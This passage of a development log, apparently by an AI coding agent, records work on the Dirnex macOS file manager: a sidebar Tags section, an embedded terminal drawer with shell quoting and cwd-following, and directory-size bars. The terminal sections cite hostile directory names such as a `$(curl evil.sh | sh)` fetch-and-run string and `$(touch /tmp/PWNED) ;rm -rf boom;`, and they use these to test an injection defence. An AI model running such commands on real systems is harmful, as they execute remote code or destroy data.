  submenu**, rebuilt on open via `NSMenuDelegate` and sharing ⌃T's item builder (`tagMenuItems`) so
  there is one definition of what the tag menu contains. Right-click **takes focus first** — items
  dispatch through the responder chain, so without it a right-click in the inactive pane would run
  against the other one.
- **Retargeting, and the bug in it (found live).** Marks outrank the cursor here, so right-clicking a
  row *inside* the marked set acts on the set, while right-clicking *outside* it collapses onto that
  one row — else you point at one file and operate on others. My first cut called `syncCursorToTable`
  + `updateChrome`, which updated the footer and the cursor but **not the rows**: the footer said
  "7 items" while five rows still rendered bold red, a menu about to act on one file over a pane
  drawing five as chosen. `renderRefresh` fixes it. Third time this pass has been the same lesson —
  *the model changed, and the table is only a renderer.*

**VERIFIED LIVE:** dots identical to Finder's for 1/2/5-tag files (`report.pdf` [Red, Blue] → whole
blue leading, red sliver behind, exactly like the probe's `two.txt`); a long name truncating with an
ellipsis before its dots; untagged rows drawing nothing; the hollow ring for colourless `Quokka`;
adding Green from the right-click **submenu** and watching it become the new lead dot; the entry menu,
the background menu, Paste correctly greyed; right-click inside the marked set keeping all 7; and
right-click outside it collapsing to the clicked row with **every red mark cleared**. 588 core + 33
app tests, swiftformat + swiftlint-strict clean, artifacts removed.
**NEXT (M6 pass 6):** the terminal drawer, or size-visualization mode — the next two `[ ]` items.

Progress (2026-07-15, M6 pass 6 — the sidebar's Tags section): user asked for Finder's Tags list in
the sidebar, gated on View ▸ Show Tags. VERIFIED LIVE. The Finder-tags box was already `[x]`; this is
a follow-on that needed **no new panel code at all** — a tag row is a *search*, not a place, so a
click runs `SpotlightQuery(tags:)` through the same `performSearch` a saved search uses and lands a
results tab titled with the tag. Sections now read Searches / Favorites / Volumes / Servers / **Tags**
(last, where Finder puts it). New `SidebarViewController+Tags.swift`, mirroring the `+Searches` /
`+Servers` split — the main file was 453 lines against the 500 limit, so only the `Row` cases and the
two stored properties an extension cannot hold (`showsAllTags`, `renderedTagNames`) landed there, and
`rebuild()` had to widen to internal (Swift `private` doesn't cross files — the recurring gotcha).
- **`FinderTagColor.displayOrder` (core, +2 tests → 590).** The section needed the order Finder
  *shows* (Red, Orange, Yellow, Green, Blue, Purple, Grey); `allCases` is raw-value order, which is
  Apple's storage indices — it opens on Grey and buries Red. The core had already documented the
  distinction in prose and an existing test even spelled the display order out as a **local literal**
  to assert the indices aren't it; that literal is now the property, so the test pins the real thing.
  `FinderTag.systemTags` (the stock seven, in that order) is the list both the sidebar and ⌃T offer.
- **The ⌃T menu was listing them Grey-first**, while its own comment claimed "that is the order Finder
  lists them" — false since pass 4, and invisible because nobody reads a menu's order as a bug. Now
  shares `FinderTag.systemTags`, so the comment is true and the two surfaces agree.
- **The provider learns *colours*, not just names.** `knownTagNames: Set<String>` became a private
  `[String: FinderTag]` keyed by the lowercased name — which is the shape of the truth the core
  established (a colour belongs to the *name*, system-wide; Finder keeps exactly such a database), so
  the latest sighting wins. Without it every custom tag in the sidebar would draw as a hollow ring;
  with it, live, `Zebra` came out purple. `knownTagNames` survives as a computed property (the search
  sheet's chip completion still wants names), and the stock seven are seeded and **never overwritten**
  by a sighting — a file carrying a malformed colourless `Red` (a shape the core found in the wild)
  must not repaint the sidebar's Red.
- **"All Tags…" appears only when there is something behind it.** Finder can always offer it because
  it knows every tag you own; we know the ones we have *seen* (no public API — the system's list is
  Finder's synced plist, and the core deliberately doesn't read it), so an unconditional row would do
  nothing when clicked on a fresh launch. Expansion is one-way: the row it replaces is the only thing
  that would collapse it, and nobody who asked to see their tags wants to hide them again.
- **Rebuild only on a real change.** The scan notification fires for every directory change in either
  pane on every tab, and almost none discover a new tag; rebuilding regardless would drop the
  sidebar's selection constantly. Same "is this real?" gate the server-activity observer applies.

**VERIFIED LIVE** (fixtures: real `xattr`-written tags in `~/Documents`, an indexed location — `/tmp`
is not indexed, so `mdfind` finds nothing there): the section renders as a pixel match for Finder's;
no "All Tags…" while only stock tags were known (home held `Green, Purple` — both stock, correctly not
custom); browsing to the fixtures made "All Tags…" appear with no relaunch; expanding showed `Zebra`
**purple**; clicking Red opened a "Red" results tab with the 3 fixtures **plus a Red file elsewhere on
the machine** (proving it searches everywhere, like Finder's sidebar tags, not the open folder);
unchecking View ▸ Show Tags removed the section, re-checking restored it. 590 core + 33 app tests,
swiftformat + swiftlint-strict clean, fixtures removed.

Progress (2026-07-15, M6 pass 7 — the terminal-drawer core): the pure, tested foundation of the
drawer, the core-first opener every M4/M5/M6 slice used. Box stays `[ ]` (no drawer view, no
SwiftTerm, no menu — this is the shell/cwd/quoting half). **Four new `DirnexCore/Services/` files,
purely additive** (no existing-API change, so the app is untouched and needs no rebuild). User chose
the item and the approach up front: terminal drawer next, and **SwiftTerm** (MIT, macOS 10.15+) as
the embedded emulator — Dirnex's first third-party dependency, landing in pass 8's app target only
(Sparkle 2 is already planned for M7, so a dep is not unprecedented; the core stays dependency-free).
Everything below was **probed against the real thing before any Swift was written** — the pass-1
`git` lesson — and it killed the plan's own design:

- **THE FINDING: there is no shell-integration snippet, and there should not be one.** The plan
  specced "'cd sync back' via shell integration snippet", i.e. the traditional emulator route: have
  the user paste a hook into `~/.zshrc` that prints OSC 7 (`\e]7;file://host/path\a`) at every
  prompt, then parse it out of the terminal's output. SwiftTerm even hands it over pre-parsed. macOS
  ships that hook — but probing `/etc/zshrc` showed it is sourced only via
  `[ -r "/etc/zshrc_$TERM_PROGRAM" ] && . "/etc/zshrc_$TERM_PROGRAM"`, and Apple ships only
  `/etc/zshrc_Apple_Terminal`, so an honest drawer must ship and install its own. **The kernel
  already knows.** `proc_pidinfo(PROC_PIDVNODEPATHINFO)` reports any same-user process's cwd, the
  drawer's shell is our own child, and Dirnex is unsandboxed by design (§2) — so `cd` is visible with
  **no dotfile edits, no snippet, and no cooperation from the shell**: it works on first launch, for
  `fish`/`nushell` as well as `zsh`, and for a `cd` inside a subshell or script. **Measured at
  0.75 µs**, so it can simply be asked whenever the terminal produces output — no timer, no polling
  an idle app. It is also the *safer* half of the choice: OSC 7 is bytes written by whatever runs in
  the terminal (SwiftTerm's own docs warn the contents are "entirely under the control of the remote
  application"), so an `ssh` host or a `cat` of a crafted file could push a path at the panel; the
  kernel cannot be talked into lying about our child's cwd. Nothing parses OSC 7 even though it is
  free. This is the `SSH_ASKPASS` shape again — the plan predicts machinery the OS makes unnecessary.
- **`TerminalShell.swift`** — the launch descriptor (executable, `argv[0]`, environment), pure like
  `GitCommand`'s argv. `$SHELL` is *asked*, never assumed (this very account runs `/bin/bash`; the
  `/bin/zsh` default is only a fallback). **`argv[0]` carries a leading dash** — that is the whole
  login-shell mechanism, and it is why Terminal.app runs `-zsh`: without it `~/.zprofile` never runs,
  and on a stock Mac that is where Homebrew's `shellenv` lives, so the drawer would be missing half
  the user's tools. The dash asks for login and the pty makes it interactive, so no `-l`/`-i`.
  **`TERM_PROGRAM` is load-bearing and naming ourselves honestly is what keeps us out of the user's
  files**: claiming `Apple_Terminal` would buy that OSC 7 emitter at the price of everything else in
  Apple's file — probed: with `TERM_SESSION_ID` set it creates `~/.zsh_sessions/$ID.session`,
  repoints `HISTFILE` at a per-session file, and restores-then-deletes saved session state, i.e. the
  drawer would quietly take over Terminal.app's session bookkeeping and split the user's history.
  `TERM_PROGRAM=Dirnex` names us for what we are, and `/etc/zshrc_Dirnex` does not exist. The
  inherited terminal identity (`TERM_SESSION_ID`, `ITERM_*`, `LC_TERMINAL*`) is **stripped**, because
  Dirnex launched from a terminal (`open`, `xcodebuild`) inherits it and would hand our child
  somebody else's session id.
- **`ShellCommandLine.swift`** — the security-critical half, and the reason it is pure and tested: a
  directory name is **attacker-controlled data** (unzip something from the internet and you can be
  browsing ``$(curl evil.sh | sh)``) and it lands on the command line of an interactive shell.
  POSIX single quotes have no escapes, so only the quote itself needs the classic `'` → `'\''`
  bridge; **`fish` is the exception and the reason `ShellKind` distinguishes it** — its single quotes
  *do* honour backslash escapes, so the POSIX bridge would leave a stray backslash in the path.
  **`^U^K` before the command is a safety measure, not tidiness**: the line editor may hold a
  half-typed command, and appending `cd …` to it would execute *their* words plus ours — someone who
  typed `rm -rf /` and thought better of it would watch us run `rm -rf / cd -- '/x'`. Both keys are
  needed because `bash`'s `^U` only kills *backwards* from the cursor. `cd --` ends option parsing;
  the leading space is a courtesy to `HIST_IGNORE_SPACE` users (off by default, so what actually
  keeps history clean is emitting **nothing** when the shell is already there — the common case).
- **`ShellWorkingDirectory.swift`** — the two syscall reads plus the pure follow policy. `isAtPrompt`
  is `tcgetpgrp` on the pty, which asks exactly the right question — "would my keystrokes reach the
  shell?" — and is the gate that stops Dirnex typing a `cd` into somebody's `vim`. The policy
  compares **resolved** paths on both sides, because a panel showing `/tmp` that tells its shell to
  `cd -- '/tmp'` gets `/private/tmp` back and would "follow" the shell to the place it already was,
  moving the view in response to its own message. A panel inside an archive or on SFTP never follows.
- **`ExternalTerminal.swift`** — the item's "open in iTerm/Terminal/WezTerm as alternative" half,
  `ExternalDiffTool`'s shape verbatim (injected `pathExists`, `installed`/`preferred`, uninstalled ⇒
  absent from the menu rather than an error). Two launch shapes because they are genuinely different
  programs: an app bundle via `open -a <bundle> <dir>` (Terminal, iTerm — macOS registers them as
  folder handlers, so no shell command is typed and no quoting exists on this path) vs a CLI taking a
  flag (`wezterm start --cwd <dir>`). Terminal.app is the always-installed fallback, `FileMerge`'s role.
+36 tests → **626 core tests** (was 590). `swift test` green, swiftformat + swiftlint-strict clean;
app target untouched. **VERIFIED LIVE** — a throwaway harness compiled against the real core driving
a **real login shell in a real pty** (the pass-1 method), 12/12: the kernel saw `cd` with nothing
installed anywhere; the shell followed the panel; the **ping-pong guard held against the real
`/tmp`→`/private/tmp` symlink** (and typed no second `cd`); a directory named ``it's a "test"
$(touch …) `touch …` ;rm -rf boom; & |x`` was entered **verbatim with neither substitution firing**;
`^U^K` cleared an abandoned `echo THIS_MUST_NOT_RUN` which never executed while the `cd` still
landed; `isAtPrompt` read true idle → **false while `sleep` ran** → true again; and the shell itself
reported `TP=Dirnex TERM=xterm-256color V=0.1-harness SESSION=[] CWDFN=[none]` — the inherited
session id stripped and **Apple's `update_terminal_cwd` undefined, proving its dotfile was not
sourced**. `ExternalTerminal` was driven for real too: `open -a Terminal <dir>` opened Terminal with
its shell's cwd exactly on target (read back through this pass's own libproc route), then quit.
GOTCHAS, both harness-only but both instructive: (1) **`fork()` in a process that has touched
libdispatch may only `exec`** — a Swift allocation in the child (building argv/envp) SIGTRAPs, so
every C string must be built *before* the fork; (2) a `DispatchSource` handler written in top-level
code **inherits `@MainActor`** and then trips Swift 6's `dispatch_assert_queue` when it runs on a
background queue — it needs `{ @Sendable in }`. (3) A near-miss worth recording: the harness's own
first cut compared a **raw kernel path against a resolved one** and reported a failure that did not
exist. `URL.resolvingSymlinksInPath` normalizes that pair by *stripping* `/private`, not adding it
(`/private/tmp/x` and `/tmp/x` both → `/tmp/x`), so it agrees with the kernel only when applied to
**both** sides — which the policy does, and a doc note now pins for pass 8, which supplies that closure.
**NEXT (M6 pass 8, the app layer):** add SwiftTerm (v1.14.0) to the app target, a drawer
`NSSplitViewItem` below the panes hosting `LocalProcessTerminalView` (spawned via `TerminalShell`,
`currentDirectory:` at the active pane so opening it types nothing), cwd-follow both ways off
`shellPid`/`childfd` on output-settle, and the `ExternalTerminal` menu items; then the
size-visualization mode.

Progress (2026-07-15, M6 pass 8 — the terminal-drawer app layer; **the box closes `[x]`, VERIFIED
LIVE**): the drawer is real — a login shell in a real pty under the panes, following them both ways.
**Dirnex's first third-party dependency landed** (SwiftTerm v1.14.0, `exactVersion`, MIT), whose
resolved revision was checked against the tag's own hash from `git ls-remote`. That exposed a
`.gitignore` rule that had been harmless until this pass: **`Package.resolved` was blanket-ignored**
— correct while the only package was local `DirnexCore` (a library resolves at its checkout), wrong
the moment the app gained a remote dep, because `exactVersion` pins the *tag* and a tag can be
moved; the resolution file is the only thing pinning the **revision**. Now un-ignored for the app's
copy only (Apple's own rule: apps commit their resolution, libraries don't). Pass 7's four
core files needed **no changes to be used** — the app only supplies the two things a pure core
can't: SwiftTerm's API surface and the OS's answers. Both were **probed before any Swift was
written** (the pass-1 method), and both the plan's own shape and my own first design were corrected
by what the probe said:
- **THE BLOCKER, and a real cost the plan didn't foresee: SwiftTerm needs Xcode 26's Metal
  toolchain.** v1.12.0 added a Metal renderer with `resources: [.process("Apple/Metal/Shaders.metal")]`,
  so Xcode compiles that shader on **every build regardless of whether we ever use it** (we don't —
  `setUseMetal` is opt-in and defaults off; the toolchain is a pure build-time tax). Xcode 26 no
  longer bundles the compiler, so the first build died on `cannot execute tool 'metal'`. The escape
  hatch was v1.11.2, the last release before the renderer — measured, not guessed, at **2,742 added
  lines** across the emulator core, the Mac view and `LocalProcess` since (PTY backpressure, an
  `EV_VANISHED` crash fix, macOS 26 tracking), i.e. a year-old emulator to dodge a download. User
  chose the toolchain: `xcodebuild -downloadComponent MetalToolchain`, **688 MB**, one-time per
  machine — **and a one-line step M7's notarized-DMG CI now needs.** Resolving SwiftTerm also pulls
  `swift-argument-parser` (its `Termcast` demo's dep); it is pinned but never linked.
- **`@preconcurrency` on the SwiftTerm delegate, earned rather than sprinkled.** SwiftTerm is a
  Swift 5 module whose delegate protocol carries no isolation, so a `@MainActor` conformance turns
  the guarantee into a *runtime assertion* — worth checking, not hoping. Read the library: every
  delivery runs on the queue `LocalProcess` is built with, which `LocalProcessTerminalView` leaves
  nil and the library resolves to `DispatchQueue.main` (`dataReceived` via `drainReceivedData`,
  `processTerminated` via a `DispatchSource` on that same queue); the one background-queue call site
  is commented out upstream. The annotation is sound because the code says so.
- **THE BUG LIVE VERIFICATION CAUGHT, on the first run, on this very machine: `LANG=en_UA.UTF-8`,
  and `perl: warning: Setting locale failed.`** macOS lets you pick language and region separately,
  and this account is English-in-Ukraine — a pair for which **no locale exists** (Apple ships
  `en_US`, `uk_UA`, and 81 others; not that one). Pass 7's `localeIdentifier` was honest and the app
  fed it a preference, not a locale. `TerminalShell.usableLocaleIdentifier` now runs it past an
  injected probe (app-side: `newlocale(3)`, **208 ns**, asks the same database the child's
  `setlocale` will, and unlike `setlocale` doesn't touch our own process-global locale) and falls
  back to **`C.UTF-8`** — neutral, because the point of `LANG` is the *codeset*, and inventing
  `en_US` for a Ukrainian user would be a guess about their conventions where `C` is an honest
  absence of one. Verified after: `LANG=[C.UTF-8]`, perl silent, and `Ünïcodé-Хостинг-日本語.txt`
  round-trips intact — Latin, Cyrillic and CJK, all 39 bytes. **This is what the plan's "shell
  integration snippet" would never have found: it is Terminal.app's own famous bug, reproduced
  because we set the same variable.**
- **`TerminalDrawerViewController`** — the thin client. `$SHELL` asked (this account really is
  `/bin/bash` — the login banner proved it live), `execName` with its dash (the process table shows
  `-bash`), `currentDirectory:` at the active pane so **opening the drawer types nothing**, and the
  shell **spawned lazily on first open**, never at window load. `dataReceived` is overridden to ask
  the kernel where the shell is **on every chunk of output — no timer, and an idle app is asked
  nothing**; at 0.75 µs (pass 7) that beats a debounce, since the expensive half (navigating a pane)
  is gated behind an actual change and a `cd` is rare where echoed keystrokes are not.
- **⌃`, and the responder chain doing the work.** User picked it over the ⌃-letter layer the app's
  own popups live on (⌃T/⌃D/⌃Q) — every one of those letters is the shell's (⌃D is EOF, ⌃Q is XON),
  and the drawer is the one surface whose keystrokes belong to somebody else. No stand-aside code
  was needed: a focused terminal leaves **no pane in the responder chain**, so the pane commands
  find no target and disable themselves — *visible in the live Go menu, entirely greyed* — and their
  keys fall through. ⌃D really did reach the shell as EOF. The one place that needed a hand was the
  window's Esc monitor, which would have eaten `vim`'s entire modal interface to close a preview.
- **`ExternalTerminalLauncher`** — `ExternalDiffLauncher` verbatim over the pure model; `Open in
  Terminal` (Go menu, no shortcut, generic title so the registry keeps one title for menu and
  palette alike) opened Terminal.app at the pane's directory, iTerm/WezTerm being absent here.
+6 tests → **632 core tests** (was 626) + 33 app; `swift test` green, swiftformat + swiftlint-strict
clean. Two recurring gotchas re-fired and were paid down rather than suppressed: `validateMenuItem`'s
cyclomatic limit (Go's items moved to `validateNavigationItem`) and `BrowserWindowController`'s
250-line body (Quick View moved to `+QuickView`, mirroring the pane's own split).
**VERIFIED LIVE**, the built app driven end to end: the drawer opened at `~` with **no `cd` typed**;
`cd /usr/local` in the shell walked the pane there **without stealing the keyboard**; clicking the
other pane typed exactly ` cd -- '/Users/oleg/Dev/Common'` (leading space, `--`, POSIX quotes); a
directory named ``it's a "test" $(touch /tmp/PWNED) `touch /tmp/PWNED2` ;rm -rf boom; & |x`` was
typed **verbatim with neither canary created**; the **ping-pong guard held against the real `/tmp`
symlink** (pane stayed on `/tmp`, one `cd`, no second); `isAtPrompt` **typed nothing at all while
`sleep 15` held the foreground**, and nothing retroactively after; `exit` closed the drawer and the
next ⌃` gave a clean screen and a fresh shell **in the active pane's directory**; and ⌘Q left **no
orphaned shell**. GOTCHAS: (1) **a notification banner (`UserNotificationCenter`) taking front makes
Dirnex's window non-key, which greys out *every* pane menu item and swallows ⌘L** — this looked
exactly like a focus bug I had introduced, and I nearly "fixed" a non-bug; re-tested with the banner
gone, clicking a pane row takes focus back correctly. Verify twice before believing a UI symptom.
(2) The drawer's first open was a **four-line sliver** — AppKit gives an item with no saved geometry
its `minimumThickness` — and it was sitting in my own verification screenshots for several passes
before I read them; `shouldSizeTerminalDrawer` now seeds 200 pt on the first open only, the same
first-launch-has-no-autosave trick `shouldCenterPanesDivider` uses. The drawer's height *and* its
open/closed state persist via `NSSplitView` autosave, so a drawer left open reopens with the window
(and spawns its shell then) exactly as the sidebar behaves.
FOLLOW-UP (user, same day): the prompt sat flush against the drawer's left border. SwiftTerm draws
column zero against its own bounds and has **no padding API**, so the view is inset 6 pt and the
container paints the strip — asking the *terminal* for `nativeBackgroundColor` rather than copying a
colour, since that background moves twice (Dark Mode via `textBackgroundColor`, and OSC 11).
FOLLOW-UP (user, same day): **the drawer beeped on every pane switch** — "like pressing a
non-existent shortcut", which is exactly what it was: `NSSound.beep()`, reached the long way round.
`ShellCommandLine`'s `^U^K` opens the follow-`cd`, and **`bash` binds `^U` to readline's
`unix-line-discard`, which *rings the bell* instead of killing when the cursor is at column zero** —
i.e. at every idle prompt, which is the only state we ever type into. The BEL reaches SwiftTerm,
whose `bell` delegate is `NSSound.beep()`. Fixed by **prefixing one space**, so `^U` always has
something to kill; the space dies with the line. Probed in a real pty before and after, across
`bash`/`zsh` × emacs/vi × empty/half-typed, driving the **actual bytes the shipping code emits**:
the whole matrix has exactly one BEL, `bash` + bare `^U` + empty prompt, and it is gone. **The two
obvious "cleaner" fixes are both wrong, and the pty said so.** `^A^K` (the idiomatic clear-line)
is a **security regression**: in `bash` *vi* mode neither `^A` nor `^K` is bound, so both insert
**literally**, nothing is cleared, and a half-typed `echo CANARY` **executed** with our `cd` appended
— precisely the `rm -rf /` hazard the sequence exists to prevent. `^U` alone leaves the tail of a
line abandoned mid-cursor. Only `^U` is bound in vi-insert, so the fix had to keep it. **Pre-existing
and NOT fixed** (separate from the beep, and invisible to a user in emacs mode): in vi-insert `^K`
inserts literally, so the `cd` never lands and the shell prints `bash: \x0b: command not found` —
today's `^U^K` is equally broken there. +2 tests → **634 core**; the exact-sequence expectations in
`ShellCommandLineTests`/`ShellWorkingDirectoryTests` pin the space, one of them explicitly as the
beep regression. LESSON, the same one as the sliver: **pass 8's live verification watched the `cd`
appear and never noticed the sound**; a screenshot cannot hear, and the drawer is the one surface
that talks back in audio.
FOLLOW-UP (user, same day): **the vi-mode `cd`, which pass 8 logged as "pre-existing and NOT fixed"
— now fixed, and it was worse than logged.** Dumping both keymaps out of the real shells settles the
design question: **neither `bash`'s `vi-insert` nor `zsh`'s `viins` binds any forward kill** — `^K`,
`^A`, `^E` are all `self-insert` in both — so there was never a keystroke to find. Two things the
beep pass missed, both live in shipped code: (1) **`zsh` binds `^U` to `vi-kill-line`, which kills
back only to *where insert mode was entered*.** A user who types a command, hits `ESC`, then `A` to
append has their insert point at end-of-line, so `^U` clears **nothing** and their abandoned words
**execute** with our `cd` glued on — the exact `rm -rf /` hazard the clear-line exists to prevent,
and the same verdict pass 8 handed `^A^K`. Dropping `^K` does not save it. (2) **`^U^K` rings 5–8
BELs in vi *command* mode**, so pass 8's beep fix never held for vi users. Measured over
bash/zsh × emacs/vi × 6 prompt states: old `^U^K` lands **8/18**, executes user text once, **26
BELs**. **Fix: `^C` alone, and the insight is that it is not a keystroke** — it is `VINTR`, turned
into `SIGINT` by the *terminal line discipline* below the editor, so the keymap cannot matter; and
every shell answers `SIGINT` at a prompt with a fresh line **in insert mode**, the only thing that
also rescues a user idling in vi *command* mode (where `cd -- '/x'` is read as editor commands).
**18/18 land, 0 executions, 0 BELs**, driving the bytes `swiftc` actually emits. The
flush hazard is real but does not bite — `SIGINT` flushes the tty input queue, yet the `cd` is
queued *behind* the signal and survived **96/96** across same-write/split-write/delayed. It is safe
to send a signal at all only because `isAtPrompt` (`tcgetpgrp == shell`) already gates every write,
so it can never reach somebody's `vim`. **COST, chosen deliberately by the user over leaving vi
broken:** `SIGINT` redraws the prompt, so a followed `cd` leaves the abandoned prompt above it —
3 pane switches render **7 rows instead of 4** (2 lines per move, not 1), for emacs users too. Only
real moves pay it (`command(toFollow:)` stays silent when the shell is already there). Exact-sequence
tests re-pinned to `^C`; the ding regression now asserts no `^U` exists to ring at all; +1 test that
no keymap-dependent key is ever sent → **635 core**. `fish` reasoned-through but unverified (not
installed). LESSON: **the idiomatic clear-line keys are all bets on a keymap we do not own** — three
passes reached for `^A^K`, `^U^K`, `^U`, and a pty called each one; the only reliable way into a line
editor you do not control is the channel underneath it.
**NEXT (M6 pass 9):** size-visualization mode (ncdu-style bars, async, cached) — the next `[ ]`
item; then Share sheet / "Open With" / Services, and the automation slice that M6's exit criteria
name ("a user-defined convert-to-webp script runs from the palette").

Progress (2026-07-16, M6 pass 9 — the size-visualization core): the pure, tested half of the
size-viz item, the same core-first opener every slice since M4 has used. Box stays `[ ]` (no toggle,
no bar column, no provider, no app wiring) — this is the projection/cache half. **Two new
`DirnexCore/VFS/` files plus one purely-additive method on `DirectoryModel`/`Panel`** (no existing
API changed, so the app is untouched and needs no rebuild). Everything was **probed before any Swift
was written** (the pass-1 method), and the probes corrected both the plan's framing and my own first
design:
- **ncdu's rule, read from its manual instead of from memory — and it is not either/or, it is
  both.** *"Percentage is relative to the size of the current directory, graph is relative to the
  largest item in the current directory."* The two answer different questions and one number cannot
  do both, so `SizeBar` carries **`fraction`** (max-relative — the bar length, which is the only
  reason a bar column is legible when one row dominates) *and* **`share`** (total-relative — the
  label). I had been about to pick one.
- **Logical bytes, deliberately against ncdu's default of allocated disk usage — and the gap is
  real, measured, and runs BOTH ways.** `.git` (thousands of small files) allocates ~2x its logical
  bytes in 4 KB block round-up (ratio 0.513); conversely one **64 MB sparse LMDB file** in
  `DirnexCore/.build` allocates only 27 MB, pulling that whole tree to 1.082. So the choice matters
  and is not cosmetic. It goes to logical anyway because **the bar must agree with the number
  rendered beside it**: a row whose bar is twice its neighbour's while its own size column reads
  smaller is incoherent. ncdu can default to disk usage because it is a disk-usage tool *with no
  size column*; Dirnex is a file manager with one, already showing `FileEntry.byteSize`. Payoff: the
  mode reuses `DirectorySizer` exactly, with no second byte source.
- **Hard links: measured, then deliberately NOT de-duped** (ncdu does). Probed: **zero hardlinked
  files across `/Applications`, `/usr/local`, `/opt/homebrew`**; the only 10 in `~/Dev` are npm's
  `esbuild` binary, linked between `esbuild/bin/` and `@esbuild/darwin-arm64/bin/` *within the same
  `node_modules`* — so a JS tree double-counts one ~10 MB binary, ≈3 % of a 300 MB `node_modules`.
  (dev,ino) bookkeeping to correct a 3 % error that essentially never occurs is not worth it, and
  `FileEntry` carries no device number to key it on.
- **Walk cost tracks ENTRY COUNT, not bytes — the finding that shapes the whole mode.** The real
  `DirectorySizer` walks 1 TB of `~/Movies` in **0.01 s** but 17 GB of `~/Dev` in **7.7 s** (it is
  all `node_modules`); `/Applications` 8.5 s. And **`~` takes 41 s** once hidden rows are shown (68
  directories, not the 17 visible ones — `.lmstudio`, `.android`, `.cache`, `.npm` are all there).
  So bars *must* stream in progressively, and the cache is not a nicety.
- **The brutal dynamic range is a text-mode artifact, not a fact about the data.** In `~`, Movies is
  79 % of the total and at ncdu's 20 character cells **only 1 of 17 rows earns even one filled
  cell** — which is precisely why ncdu grew `--graph-style eighth-block`. We draw in AppKit at
  continuous width, ~8x finer than eighth-blocks, so pass 10 needs only a **minimum-ink rule** (a
  real 17 GB folder must never render as literally nothing).
- **`SizeVisualization`** — shaped like `GitStatusSnapshot`: every scan happens at construction so
  `bar(for:)` is O(1), because a panel asks once per visible row per render. Three properties, each
  pinned by a test. **(1) Unknown is not zero**: an unsized directory has *no* bar rather than a
  zero-width one — collapsing the two paints an unwalked 40 GB folder as empty, and only
  `computedSize` can tell them apart. **(2) Both denominators cover *visible* rows only** — hiding
  dotfiles or typing a filter re-scales everything, because a bar drawn relative to a row you cannot
  see is unexplainable, and shares that silently fail to reach 100 % are worse than shares of what is
  on screen. **(3) It re-scales for free while walks land**: rebuilding the whole projection per
  render needs no incremental bar-width bookkeeping, at the price (accepted, documented) that `share`
  is a share of *what is known so far* and settles as results arrive. The total **saturates** and
  negatives **clamp**, because `SFTPListingParser` builds sizes out of *text* and a panel must not
  trap on a hostile server's arithmetic.
- **`DirectorySizeCache`** — LRU, capacity **512, because the unit of caching here is one
  directory's total** and a size-viz panel stores one per child row: capacity is counted in "several
  panels' worth of children", not in `GitStatusProvider`'s "a few repositories" (8 snapshots), where
  the unit is the repo. Reads are **non-mutating** (eviction ordered by last *store*): the intended
  stale-while-revalidate re-stores on every visit so the orders coincide, and a mispredicted eviction
  costs a re-walk, never a wrong number — worth more than mutating on the render path. The cache is
  explicitly **a latency optimization and never an authority**: we watch only the *displayed*
  directory, so a tree that changes while you look elsewhere is silently stale (ncdu has the same
  property — its scan is a snapshot until `r` — but ncdu *looks* like a snapshot where a file panel
  looks live).
- **The invalidation rule is shaped by what an FSEvents ping actually proves.** Read
  `DirectoryWatcher` rather than assuming: its callback **discards the event paths** and the stream
  is recursive, so the only fact on offer is "something under the watched directory changed". Hence
  `invalidate(under:)` drops every cached total on the same **root-to-leaf line**: the path *and its
  descendants* (the ping does not say which one changed) *and its ancestors* (their totals sum it
  in). **Siblings survive** — that is the whole value. It is the **mirror image of
  `GitStatusSnapshot`'s roll-up**: that pushes a leaf's *status* up the line, this pushes a leaf's
  *staleness* up the same one. Conservative by construction and correct for either caller (an exact
  event path invalidates precisely; a watched root invalidates its whole line), because the trade is
  not symmetric — over-invalidating costs a re-walk, under-invalidating shows a wrong number. It goes
  through `VFSPath.isSelfOrDescendant` (backend-scoped, and right about `/a` vs `/ab`) rather than a
  hand-rolled prefix test.
FINDING (measured, and it added the one API change): **seeding a panel from the cache would have
been slower than having no cache at all.** A seed arrives as a burst of N totals and
`setDirectorySize` re-sorts the entire listing on *every* call — measured on the main actor at
5.7 ms for 68 rows, **284 ms at 1,000, and 2.5 s at 3,000**, quadratic. The cache exists to make bars
appear the instant a directory opens, and naively wired it would have frozen the panel for 2.5 s
doing so. `setDirectorySizes` (bulk, one recompute) measures **4050x faster at 3,000 rows — 2.47 s →
0.61 ms — with byte-identical ordering**, so it is the same answer, not a cheaper one.
+34 tests → **669 core tests** (was 635); `swift test` green, swiftformat + swiftlint-strict clean.
The recurring type-body-length gotcha re-fired and was paid down rather than suppressed: `PanelTests`
crossed its 250-line limit, so the computed-size tests moved to `PanelSizeTests` along the seam the
suite's own `MARK` already drew (the `CopyEngine*Tests` precedent), collapsing a duplicated helper
on the way. **VERIFIED LIVE** — a throwaway harness compiled against the real core, driving real
listings and real walks: the Dirnex repo rendered `DirnexCore` 55.8 % / `build` 43.2 % / `.git`
0.8 %, and `~` rendered Movies 79.2 % (1003.7 GB) / Library 10.3 % / Documents 3.0 %; on both,
**shares summed to exactly 1.000000, exactly one row filled the bar, and it was the heaviest one** —
with `du` agreeing inside the expected logical-vs-allocated gap (1.085 on the repo, 1.000 on Movies).
The cache was driven against a **real filesystem change**: growing `.../a/b/file.bin` from 1 KB to
9 KB and invalidating dropped `/a/b`, `/a` and the root — all three genuinely stale, truth having
moved 1050 → 9050 — while the **sibling survived and was still correct**. GOTCHA (harness-only, but
instructive): the probe **segfaulted on its first run**, in a program containing no unsafe code —
`String(format: "%s", swiftString)`. `%s` expects a C string, and handing it a Swift `String` is
undefined behaviour; `%@` or manual padding is the fix.
**NEXT (M6 pass 10, the app layer):** the panel toggle and the bar column drawn at **continuous
width** with the minimum-ink rule; a `DirectorySizeProvider` owning the cache (off-main walks via
`DirectoryLoader.size`, serialized, streamed in and seeded in bulk through `setDirectorySizes`,
FSEvents → `invalidate(under:)`), stale-while-revalidate on navigation, and no bar on the `..` row
(app-synthesized, so the core projection never sees it). **One policy question the 41 s measurement
forces and the user should settle: does toggling the mode auto-scan every child — ncdu's model,
where you wait for the scan — or scan lazily/on-demand?** Extending `DirectoryWatcher` to deliver
event paths would also keep invalidation surgical instead of dropping a whole line per ping. Then
Share sheet / "Open With" / Services, and the automation slice.

Progress (2026-07-16, M6 pass 10 — the size-visualization app layer; **the box closes `[x]`, VERIFIED
LIVE**): the toggle (⌃B), the bar column, and the scan that fills it. **The user settled pass 9's
policy question: auto-scan, ncdu's model** — and it was the only live option, because the core's
"unknown is not zero" rule means a lazy mode opens on a column that is empty for every folder in it.
**Per tab** (not an app-wide preference like Show Tags): it is what "toggle *panel* to bars" says, it
is the dual-pane payoff, and above all this is the one mode in the app that *spends* something to be
on. Probing again ran ahead of the Swift (the pass-1 method), and it **overturned two of pass 9's own
conclusions**:
